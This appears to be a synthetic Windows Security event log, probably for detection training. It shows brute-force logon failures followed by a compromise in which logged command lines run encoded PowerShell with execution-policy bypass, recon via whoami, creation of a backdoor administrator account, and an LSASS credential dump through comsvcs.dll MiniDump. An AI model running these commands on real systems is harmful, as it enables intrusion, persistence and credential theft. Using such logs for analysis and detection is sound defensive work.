TimeCreated: 2026-03-04T03:14:22.000Z | EventID: 4625 | Level: Information | Computer: WORKSTATION01 | Channel: Security | Provider: Microsoft-Windows-Security-Auditing | Message: An account failed to log on. Subject: Security ID: S-1-0-0. Logon Type: 3. Account: Administrator. Source Network Address: 185.22.91.44. Failure Reason: Unknown user name or bad password.
TimeCreated: 2026-03-04T03:14:25.000Z | EventID: 4625 | Level: Information | Computer: WORKSTATION01 | Channel: Security | Provider: Microsoft-Windows-Security-Auditing | Message: An account failed to log on. Subject: Security ID: S-1-0-0. Logon Type: 3. Account: Administrator. Source Network Address: 185.22.91.44. Failure Reason: Unknown user name or bad password.
TimeCreated: 2026-03-04T03:14:28.000Z | EventID: 4625 | Level: Information | Computer: WORKSTATION01 | Channel: Security | Provider: Microsoft-Windows-Security-Auditing | Message: An account failed to log on. Subject: Security ID: S-1-0-0. Logon Type: 3. Account: Administrator. Source Network Address: 185.22.91.44. Failure Reason: Unknown user name or bad password.
TimeCreated: 2026-03-04T03:14:31.000Z | EventID: 4625 | Level: Information | Computer: WORKSTATION01 | Channel: Security | Provider: Microsoft-Windows-Security-Auditing | Message: An account failed to log on. Subject: Security ID: S-1-0-0. Logon Type: 3. Account: Administrator. Source Network Address: 185.22.91.44. Failure Reason: Unknown user name or bad password.
TimeCreated: 2026-03-04T03:14:34.000Z | EventID: 4625 | Level: Information | Computer: WORKSTATION01 | Channel: Security | Provider: Microsoft-Windows-Security-Auditing | Message: An account failed to log on. Subject: Security ID: S-1-0-0. Logon Type: 3. Account: Administrator. Source Network Address: 185.22.91.44. Failure Reason: Unknown user name or bad password.
TimeCreated: 2026-03-04T03:14:37.000Z | EventID: 4625 | Level: Information | Computer: WORKSTATION01 | Channel: Security | Provider: Microsoft-Windows-Security-Auditing | Message: An account failed to log on. Subject: Security ID: S-1-0-0. Logon Type: 3. Account: admin. Source Network Address: 185.22.91.44. Failure Reason: Unknown user name or bad password.
TimeCreated: 2026-03-04T03:14:40.000Z | EventID: 4625 | Level: Information | Computer: WORKSTATION01 | Channel: Security | Provider: Microsoft-Windows-Security-Auditing | Message: An account failed to log on. Subject: Security ID: S-1-0-0. Logon Type: 3. Account: admin. Source Network Address: 185.22.91.44. Failure Reason: Unknown user name or bad password.
TimeCreated: 2026-03-04T03:14:43.000Z | EventID: 4625 | Level: Information | Computer: WORKSTATION01 | Channel: Security | Provider: Microsoft-Windows-Security-Auditing | Message: An account failed to log on. Subject: Security ID: S-1-0-0. Logon Type: 10. Account: user01. Source Network Address: 103.45.67.89. Failure Reason: Unknown user name or bad password.
TimeCreated: 2026-03-04T03:14:46.000Z | EventID: 4625 | Level: Information | Computer: WORKSTATION01 | Channel: Security | Provider: Microsoft-Windows-Security-Auditing | Message: An account failed to log on. Subject: Security ID: S-1-0-0. Logon Type: 10. Account: user01. Source Network Address: 103.45.67.89. Failure Reason: Unknown user name or bad password.
TimeCreated: 2026-03-04T03:14:49.000Z | EventID: 4625 | Level: Information | Computer: WORKSTATION01 | Channel: Security | Provider: Microsoft-Windows-Security-Auditing | Message: An account failed to log on. Subject: Security ID: S-1-0-0. Logon Type: 10. Account: user01. Source Network Address: 103.45.67.89. Failure Reason: Unknown user name or bad password.
TimeCreated: 2026-03-04T03:20:00.000Z | EventID: 4624 | Level: Information | Computer: WORKSTATION01 | Channel: Security | Provider: Microsoft-Windows-Security-Auditing | Message: An account was successfully logged on. Subject: Security ID: S-1-5-18. Logon Type: 10. Account: jsmith. Source Network Address: 10.0.1.55. Logon Process: User32.
TimeCreated: 2026-03-04T03:25:00.000Z | EventID: 4672 | Level: Information | Computer: WORKSTATION01 | Channel: Security | Provider: Microsoft-Windows-Security-Auditing | Message: Special privileges assigned to new logon. Subject: Security ID: S-1-5-21-3623811015-3361044348-30300820-1013. Account: jsmith. Privileges: SeDebugPrivilege, SeTakeOwnershipPrivilege, SeBackupPrivilege.
TimeCreated: 2026-03-04T03:30:00.000Z | EventID: 4688 | Level: Information | Computer: WORKSTATION01 | Channel: Security | Provider: Microsoft-Windows-Security-Auditing | Message: A new process has been created. Subject: Security ID: S-1-5-21-3623811015-3361044348-30300820-1013. Account: jsmith. New Process Name: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe. Process Command Line: powershell.exe -ep bypass -nop -enc SQBFAFgAIAAoA...
TimeCreated: 2026-03-04T03:30:15.000Z | EventID: 4688 | Level: Information | Computer: WORKSTATION01 | Channel: Security | Provider: Microsoft-Windows-Security-Auditing | Message: A new process has been created. Subject: Security ID: S-1-5-21-3623811015-3361044348-30300820-1013. Account: jsmith. New Process Name: C:\Windows\System32\cmd.exe. Process Command Line: cmd.exe /c whoami /all > C:\temp\recon.txt
TimeCreated: 2026-03-04T03:30:30.000Z | EventID: 4688 | Level: Information | Computer: WORKSTATION01 | Channel: Security | Provider: Microsoft-Windows-Security-Auditing | Message: A new process has been created. Subject: Security ID: S-1-5-21-3623811015-3361044348-30300820-1013. Account: jsmith. New Process Name: C:\Windows\System32\net.exe. Process Command Line: net user hacker P@ssw0rd /add
TimeCreated: 2026-03-04T03:30:45.000Z | EventID: 4688 | Level: Information | Computer: WORKSTATION01 | Channel: Security | Provider: Microsoft-Windows-Security-Auditing | Message: A new process has been created. Subject: Security ID: S-1-5-21-3623811015-3361044348-30300820-1013. Account: jsmith. New Process Name: C:\Windows\System32\net.exe. Process Command Line: net localgroup Administrators hacker /add
TimeCreated: 2026-03-04T03:31:00.000Z | EventID: 4688 | Level: Information | Computer: WORKSTATION01 | Channel: Security | Provider: Microsoft-Windows-Security-Auditing | Message: A new process has been created. Subject: Security ID: S-1-5-18. Account: SYSTEM. New Process Name: C:\Windows\System32\rundll32.exe. Process Command Line: rundll32.exe comsvcs.dll MiniDump 672 C:\temp\lsass.dmp full
TimeCreated: 2026-03-04T04:00:00.000Z | EventID: 4624 | Level: Information | Computer: WORKSTATION01 | Channel: Security | Provider: Microsoft-Windows-Security-Auditing | Message: An account was successfully logged on. Subject: Security ID: S-1-5-18. Logon Type: 3. Account: svc_backup. Source Network Address: 10.0.1.10. Logon Process: NtLmSsp.
TimeCreated: 2026-03-04T04:00:15.000Z | EventID: 4672 | Level: Information | Computer: WORKSTATION01 | Channel: Security | Provider: Microsoft-Windows-Security-Auditing | Message: Special privileges assigned to new logon. Subject: Security ID: S-1-5-21-3623811015-3361044348-30300820-1020. Account: svc_backup. Privileges: SeBackupPrivilege, SeRestorePrivilege.
TimeCreated: 2026-03-04T05:00:00.000Z | EventID: 4625 | Level: Information | Computer: WORKSTATION01 | Channel: Security | Provider: Microsoft-Windows-Security-Auditing | Message: An account failed to log on. Subject: Security ID: S-1-0-0. Logon Type: 3. Account: Administrator. Source Network Address: 91.134.55.77. Failure Reason: Account locked out.
